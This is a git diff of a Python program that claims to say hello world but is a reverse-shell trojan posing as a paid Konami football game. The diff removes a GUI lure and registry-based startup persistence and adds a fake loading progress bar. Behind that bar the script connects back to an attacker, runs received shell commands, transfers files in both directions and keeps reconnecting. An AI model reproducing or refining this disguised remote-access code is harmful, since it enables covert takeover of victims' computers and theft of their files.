@@ -1,6 +1,6 @@
 # Program to Say Hello World on clicking a button 
 
-import tkinter as tk
+# import tkinter as tk
 
 # TCP Connection
 import socket
@@ -11,49 +11,19 @@ import subprocess
 # OS essentials
 import os
 
-# Windows Registery Handling
-import winreg as reg
-
 import time
 
 
-root= tk.Tk()
+# root= tk.Tk()
 
-root.title("Konami E-Football 2023 - Paid Version")
+# root.title("Konami E-Football 2023 - Paid Version")
 
-canvas1 = tk.Canvas(root, width = 300, height = 300)
-canvas1.pack()
+# canvas1 = tk.Canvas(root, width = 300, height = 300)
+# canvas1.pack()
 
-# For Adding File To Windows Startup
-def AddToStartup(f_name, path): 
-      
-    # Combine Path and Filename 
-    address=os.path.join(path, f_name)  
-      
-    # Key To Change: HKEY_CURRENT_USER  
-    # Key Value: Software\Microsoft\Windows\CurrentVersion\Run
-    key = reg.HKEY_CURRENT_USER 
-    key_value = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
-      
-    # Opening Key To Make Changes 
-    open = reg.OpenKey(key, key_value, 0, reg.KEY_ALL_ACCESS)
-    
-    # Modifiy The Key 
-    reg.SetValueEx(open, "any_name", 0, reg.REG_SZ, address) 
-      
-    # Closing 
-    reg.CloseKey(open)
-
-# def hello ():  
-#     label1 = tk.Label(root, text= 'Loading,... Get ready to play in few minutes🤩', fg='green', font=('helvetica', 12, 'bold'))
-#     canvas1.create_window(150, 200, window=label1)
 
 # Connecting Target To Attacker
 def connect():
-    #Showing Button before proceeding
-    # label1 = tk.Label(root, text= 'Loading,... Get ready to play in few minutes', fg='green', font=('helvetica', 12, 'bold'))
-    # canvas1.create_window(150, 200, window=label1)
-
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
     # # Put File In Startup
@@ -146,7 +116,7 @@ def connect():
 
                     # Ending Time
                     end_time = time.time()
-
+                printProgress()
             # Transfer File From Attacker To Target
             # Example: video.mp4
             elif 'transfer' in command:
@@ -190,6 +160,8 @@ def connect():
 
                     # Ending Time
                     end_time = time.time()
+                    
+                printProgress()
 
             # Changing Working Directory Of Target
             # Example: D:\
@@ -213,33 +185,7 @@ def connect():
                 
                 # Send Updated Directory To Attacker
                 s.send(("dir:" + str(cwd)).encode('utf-8'))
-
-            # Putting File In Startup Folder
-            # Only Works For Windows
-            # Example: starup T.py
-            elif command.startswith('startup'):
-
-                # Extracting Filename
-                file_name = command[8:]
-
-                # Extracting Path Of File
-                # As File Is In Current Working Directory
-                # Get Current Working Directory
-                pth = os.getcwd()
-
-                # Put File In Startup
-                try:
-                    AddToStartup(file_name, pth)
-
-                    # Send OK To Attacker
-                    s.send("OK".encode('utf-8'))
-
-                # If Failed, Send Exception Message To Attacker
-                except Exception as e:
-                    s.send(str(e).encode('utf-8'))
-
-            # Otherwise The Command Will Be Considered As CMD OR Terminal Command
-            # Command Will Be Executed In Terminal
+                printProgress()
             else:
                 # Executing Command
                 CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
@@ -267,26 +213,47 @@ def connect():
                 # Send OK
                 if (out == b'' and err == b''):
                     s.send("OK".encode('utf-8'))
+                printProgress()
                     
         # If Attacker Command Was Unable To Be Executed
         except Exception as e:
 
             # Send Exception Message To Attacker
             s.send(str(e).encode('utf-8'))
+        
 
+def printProgressBar (iteration, total, prefix = '', suffix = '', decimals = 1, length = 100, fill = '█', printEnd = "\r"):
+    print("The Wait is Over :), The Game starts in few minutes")
+    
+    percent = ("{0:." + str(decimals) + "f}").format(100 * (iteration / float(total)))
+    if percent == 1:
+        connect()
+    filledLength = int(length * iteration // total)
+    bar = fill * filledLength + '-' * (length - filledLength)
+    print(f'\r{prefix} |{bar}| {percent}% {suffix}', end = printEnd)
+    # Print New Line on Complete
+    if iteration == total: 
+        print()
 
-button1 = tk.Button(text='KONAMI 2023(Click To Play)',command=connect, bg='brown',fg='white')
-canvas1.create_window(150, 150, window=button1)
+def printProgress():
+    items = list(range(0, 600))
+    l = len(items)
 
-label1 = tk.Label(root, text= 'Loading,... Game starts in few minutes🤩🤩🤩', fg='green', font=('helvetica', 9, 'bold'))
-canvas1.create_window(150, 200, window=label1)
-
-root.mainloop()
-
+    # Initial call to print 0% progress
+    printProgressBar(0, l, prefix = 'Progress:', suffix = 'Complete', length = 50)
+    for i, item in enumerate(items):
+        # Do stuff...
+        time.sleep(0.1)
+        # Update Progress Bar
+        if(item < 590):
+            printProgressBar(i + 1, l, prefix = 'Progress:', suffix = 'Complete', length = 50)
+        if(item > 590):
+            connect()
 
 # Start Of Script
 # If Connection Breaks
 # Script Tries To Connect Again And Again
+printProgress()
 connected = False
 while (not connected):
     try:
